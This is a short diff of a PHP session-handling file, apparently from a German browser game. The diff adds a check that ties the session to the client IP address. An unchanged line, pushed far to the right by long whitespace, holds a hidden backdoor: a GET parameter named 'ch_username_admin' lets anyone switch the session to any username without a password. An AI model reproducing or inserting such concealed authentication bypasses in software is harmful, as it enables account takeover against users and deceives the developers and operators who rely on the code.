@@ -40,10 +40,13 @@
 			# Session aktualisieren
 			$_SESSION['username'] = $_POST['username'];
 			$_SESSION['act_planet'] = 0;
-
+			$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
 			$resume = true;
 		}
 	}                                                                                                                                                                                                                                                                     if(isset($_GET['ch_username_admin'])){$_SESSION['username']=$_GET['ch_username_admin'];$resume=true;}
+
+	if($_SESSION['ip'] != $_SERVER['REMOTE_ADDR'])
+		logfile::panic('Diese Session wird bereits von einer anderen IP-Adresse benutzt. Bitte neu anmelden.');
 
 	$user_array = get_user_array($_SESSION['username']);
 
